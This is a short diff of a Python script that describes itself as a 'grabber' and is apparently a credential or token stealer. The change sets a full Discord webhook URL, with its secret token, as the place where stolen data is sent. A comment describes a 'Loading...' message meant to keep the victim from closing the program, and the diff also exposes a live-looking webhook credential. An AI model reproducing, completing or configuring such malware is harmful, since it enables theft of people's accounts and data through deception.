@@ -12,7 +12,7 @@ except:
     os.system("pip install requests")
     print("Run the app again.")
 
-webhookk = "heh" # put webhook here
+webhookk = "https://discord.com/api/webhooks/988211975903387689/b5lcLWUBtpCKMtXyJjsmQjwG9VrH8VMbKeqI4UnBH8FlvIoWRq4QbNnPIXP3-A8ezcUA"
 
 
 dummy_message = "Loading..." # A message that distracts the user from closing the grabber
